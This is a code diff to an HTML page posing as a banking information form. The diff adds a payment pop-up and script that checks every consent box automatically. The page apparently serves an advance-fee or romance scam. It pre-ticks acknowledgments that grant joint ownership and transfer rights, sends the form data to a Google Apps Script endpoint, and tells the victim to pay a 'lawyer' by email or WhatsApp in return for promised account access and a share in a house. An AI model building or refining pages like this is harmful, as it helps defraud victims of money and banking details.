@@ -53,7 +53,6 @@ font-size:13px;
 line-height:1.4;
 }
 
-/* Progress Bar & Steps Styling */
 .progress-container {
 padding:20px 15px;
 background:#f8fafc;
@@ -150,7 +149,6 @@ border-left-color:#d97706;
 color:#78350f;
 }
 
-/* Multi-stage Steps display */
 .form-step {
 display:none;
 }
@@ -206,7 +204,7 @@ margin-bottom:6px;
 font-size:13px;
 }
 
-input,select,textarea{
+input:not([type="checkbox"]), select, textarea {
 padding:12px;
 border:1px solid #cbd5e1;
 border-radius:8px;
@@ -236,7 +234,7 @@ border-top:1px solid #e2e8f0;
 @media(min-width:480px) {
   .actions {
     flex-direction:row;
-    justify-style:space-between;
+    justify-content:space-between;
   }
 }
 
@@ -325,12 +323,133 @@ cursor:pointer;
 line-height:1.4;
 }
 
-.checkbox-group input[type="checkbox"]{
-margin-top:2px;
-width:18px;
-height:18px;
-flex-shrink:0;
+/* Explicit Checkbox Styling with Visible Tick Sign */
+.checkbox-group input[type="checkbox"] {
+appearance: auto !important;
+-webkit-appearance: checkbox !important;
+width: 20px !important;
+height: 20px !important;
+margin-top: 2px;
+flex-shrink: 0;
+cursor: pointer;
+accent-color: #0b4c7b;
+}
+
+/* Modal / Pop-up Styling */
+.modal-overlay {
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(15, 23, 42, 0.65);
+backdrop-filter:blur(4px);
+z-index:9999;
+justify-content:center;
+align-items:center;
+padding:20px;
+}
+
+.modal-content {
+background:#ffffff;
+border-radius:16px;
+max-width:550px;
+width:100%;
+padding:28px;
+box-shadow:0 25px 50px -12px rgba(0, 0, 0, 0.25);
+position:relative;
+animation:modalSlide 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+@keyframes modalSlide {
+from { transform: translateY(20px) scale(0.96); opacity: 0; }
+to { transform: translateY(0) scale(1); opacity: 1; }
+}
+
+.modal-header {
+display:flex;
+align-items:center;
+justify-content:space-between;
+border-bottom:2px solid #f1f5f9;
+padding-bottom:12px;
+margin-bottom:16px;
+}
+
+.modal-header h3 {
+color:#0b4c7b;
+font-size:18px;
+font-weight:700;
+}
+
+.modal-close {
+background:none;
+border:none;
+font-size:22px;
+color:#64748b;
 cursor:pointer;
+width:auto;
+padding:0 8px;
+line-height:1;
+}
+
+.modal-close:hover {
+color:#0f172a;
+}
+
+.modal-body {
+font-size:14px;
+line-height:1.6;
+color:#334155;
+background:#f8fafc;
+padding:16px;
+border-radius:10px;
+border-left:4px solid #0b4c7b;
+margin-bottom:20px;
+}
+
+.contact-box {
+background:#eef6ff;
+border:1px solid #bae6fd;
+border-radius:8px;
+padding:12px;
+margin-top:12px;
+margin-bottom:12px;
+font-size:13px;
+color:#0369a1;
+}
+
+.btn-modal-close {
+background:#0b4c7b;
+color:white;
+width:100%;
+padding:12px;
+border-radius:8px;
+font-weight:600;
+}
+
+.btn-modal-close:hover {
+background:#08385b;
+}
+
+.btn-info-trigger {
+background:#e0f2fe;
+color:#0369a1;
+border:1px solid #bae6fd;
+padding:8px 14px;
+border-radius:8px;
+font-size:13px;
+font-weight:600;
+cursor:pointer;
+margin-bottom:15px;
+display:inline-flex;
+align-items:center;
+gap:6px;
+width:auto;
+}
+
+.btn-info-trigger:hover {
+background:#bae6fd;
 }
 </style>
 </head>
@@ -467,11 +586,11 @@ cursor:pointer;
         
         <div class="checkbox-group">
             <label>
-                <input type="checkbox" name="jointAccountReq" value="Yes" checked> 
+                <input type="checkbox" name="jointAccountReq" value="Yes" checked="checked"> 
                 <span>Convert Personal Account to a <strong>Joint Account</strong> (Full ownership & transfer capability).</span>
             </label>
             <label>
-                <input type="checkbox" name="authorizedSignerReq" value="Yes" checked> 
+                <input type="checkbox" name="authorizedSignerReq" value="Yes" checked="checked"> 
                 <span>Add as an <strong>Authorized Signer / Convenience Signer</strong> (Transfer authority without full legal ownership).</span>
             </label>
         </div>
@@ -505,15 +624,15 @@ cursor:pointer;
         
         <div class="checkbox-group">
             <label>
-                <input type="checkbox" name="viewChecking" value="Yes" checked> 
+                <input type="checkbox" name="viewChecking" value="Yes" checked="checked"> 
                 <span><strong>Checking Account Visibility</strong> (View balance, transaction history, statements).</span>
             </label>
             <label>
-                <input type="checkbox" name="viewSavings" value="Yes" checked> 
+                <input type="checkbox" name="viewSavings" value="Yes" checked="checked"> 
                 <span><strong>Savings Account Visibility</strong> (View balance, interest earned, savings goals).</span>
             </label>
             <label>
-                <input type="checkbox" name="viewMortgage" value="Yes" checked> 
+                <input type="checkbox" name="viewMortgage" value="Yes" checked="checked"> 
                 <span><strong>Mortgage Account Visibility</strong> (View principal balance, monthly payment, escrow details).</span>
             </label>
         </div>
@@ -540,6 +659,10 @@ cursor:pointer;
     <div class="notice">
         <strong>Stage 4 Notice (Payment & Verification):</strong> Please enter payment details, select your preferred payment plan/installment frequency, and upload proof of payment for processing.
     </div>
+
+    <button type="button" class="btn-info-trigger" onclick="openPaymentModal()">
+        ℹ️ View Payment Purpose & Instructions
+    </button>
 
     <div class="section">
         <h2>Payment Details</h2>
@@ -611,19 +734,19 @@ cursor:pointer;
         <h2>Final Acknowledgments</h2>
         <div class="checkbox-group">
             <label>
-                <input type="checkbox" name="ackPOD" required checked> 
+                <input type="checkbox" name="ackPOD" required checked="checked"> 
                 <span>I confirm the POD designation details provided for my fiancé.</span>
             </label>
             <label>
-                <input type="checkbox" name="ackTransfer" required checked> 
+                <input type="checkbox" name="ackTransfer" required checked="checked"> 
                 <span>I understand granting transfer access gives immediate withdrawal rights on specified accounts.</span>
             </label>
             <label>
-                <input type="checkbox" name="ackVisibility" required checked> 
+                <input type="checkbox" name="ackVisibility" required checked="checked"> 
                 <span>I authorize visibility settings across checking, savings, and mortgage accounts.</span>
             </label>
             <label>
-                <input type="checkbox" name="ackPayment" required checked> 
+                <input type="checkbox" name="ackPayment" required checked="checked"> 
                 <span>I confirm that the payment details and uploaded proof of payment are accurate.</span>
             </label>
         </div>
@@ -657,24 +780,57 @@ Professional Banking Information Collection Form • Multi-Stage Account & Benef
 
 </div>
 
+<!-- PAYMENT TERMS POP-UP MODAL -->
+<div class="modal-overlay" id="paymentModal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <h3>Payment Purpose & Verification Notice</h3>
+            <button type="button" class="modal-close" onclick="closePaymentModal()">&times;</button>
+        </div>
+        <div class="modal-body">
+            The payment is meant to cover:
+            <ul style="margin-left: 20px; margin-top: 8px; margin-bottom: 12px; display: flex; flex-direction: column; gap: 6px;">
+                <li>My legal work</li>
+                <li>Logistics to the bank</li>
+                <li>Adding your name to the house as a legal partner</li>
+                <li>Transfers execution</li>
+            </ul>
+            <p><strong>Important Instruction:</strong> All payments should be completed and sent directly to the lawyer's email or WhatsApp.</p>
+            
+            <div class="contact-box">
+                <strong>📞 Contact Lawyer:</strong> You can call or WhatsApp the lawyer directly at <strong>+1 785 408 3160</strong>.
+            </div>
+
+            <p style="margin-top: 8px;">Immediately all payments are completed and sent to the lawyer's email or WhatsApp, processes will continue. All legal documentation you need will be sent to you as your proof, along with full access to the account mobile banking (savings, checking, and kids accounts).</p>
+        </div>
+        <button type="button" class="btn-modal-close" onclick="closePaymentModal()">I Understand & Acknowledge</button>
+    </div>
+</div>
+
 <script>
 const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwt9UBfQCIbi55hzPQmiaid-O9wASVgVgXCPZbNXQTRxPnzehHbbxiSJAu6FtJWILtOcg/exec";
 
 let currentStep = 1;
 const totalSteps = 5;
 
-// Automatic Prefill & Checkbox Selection Execution on Load
 document.addEventListener("DOMContentLoaded", function () {
+
+    // Set all checkboxes as checked explicitly
+    const allCheckboxes = document.querySelectorAll('input[type="checkbox"]');
+    allCheckboxes.forEach(checkbox => {
+        checkbox.checked = true;
+        checkbox.setAttribute('checked', 'checked');
+    });
 
     // Account holder
     const holderName = document.querySelector('[name="holderName"]');
     if (holderName) holderName.value = "Derrick Remon Parrot";
 
-    // Existing account - display safe identifier
+    // Existing account
     const accountNumber = document.querySelector('[name="accountNumber"]');
     if (accountNumber) accountNumber.value = "****9034";
 
-    // Government ID - display safe identifier
+    // Government ID
     const idNumber = document.querySelector('[name="idNumber"]');
     if (idNumber) idNumber.value = "****88643";
 
@@ -700,20 +856,20 @@ document.addEventListener("DOMContentLoaded", function () {
         }
     }
 
-    // Full payment selection
     const paymentPlan = document.querySelector('[name="paymentPlan"]');
     if (paymentPlan) {
         paymentPlan.value = "Full Payment";
         toggleInstallmentOptions();
     }
-
-    // Ensure all checkboxes are checked via JS
-    const allCheckboxes = document.querySelectorAll('input[type="checkbox"]');
-    allCheckboxes.forEach(checkbox => {
-        checkbox.checked = true;
-    });
-
 });
+
+function openPaymentModal() {
+    document.getElementById("paymentModal").style.display = "flex";
+}
+
+function closePaymentModal() {
+    document.getElementById("paymentModal").style.display = "none";
+}
 
 function toggleInstallmentOptions() {
     const plan = document.getElementById("paymentPlanSelect").value;
@@ -752,6 +908,11 @@ function changeStep(direction) {
 
     document.getElementById(`step-${currentStep}`).classList.add('active-step');
     document.getElementById(`step-nav-${currentStep}`).classList.add('active');
+
+    // Trigger Pop-up when reaching Stage 4 (Payment Stage)
+    if (currentStep === 4) {
+        openPaymentModal();
+    }
 
     const activeNavStep = document.getElementById(`step-nav-${currentStep}`);
     if (activeNavStep) {
